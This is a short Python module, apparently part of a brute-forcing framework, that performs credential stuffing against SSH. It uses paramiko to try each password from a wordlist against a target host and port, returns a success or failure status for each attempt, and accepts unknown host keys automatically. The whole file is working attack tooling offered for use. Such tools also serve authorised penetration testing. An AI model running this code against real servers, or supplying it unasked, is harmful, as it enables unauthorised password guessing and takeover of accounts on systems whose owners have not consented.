#!/usr/bin/env python3
"""
ssh.py

    Module Name:
        ssh

    Author:
        Core Maintainers

    Description:
        Protocol-based module for credential stuffing ssh
"""

import dataclasses
import paramiko

from brute.core.protocol import ProtocolBruteforce


@dataclasses.dataclass
class Ssh(ProtocolBruteforce):

    name = "ssh"
    port = 22


    @property
    def success(self) -> int:
        return 0


    def init(self):
        """
        Initializes the ssh client necessary to communicate with
        service.
        """
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        self.client = client


    def brute(self, username, pwd_guess) -> int:
        """
        Throw int status instead of a string response to
        dictate success/failure during authentication.
        """

        status = 0
        try:
            self.client.connect(self.address, port=self.port,
                    username=username, password=pwd_guess)
        except paramiko.AuthenticationException:
            status = -1

        self.client.close()
        return status


if __name__ == "__main__":
    args = Ssh.parse_args()
    Ssh(
        address = args.address,
        username = args.username,
        wordlist = args.wordlist,
        delay = args.delay,
        port = args.port
    ).run()
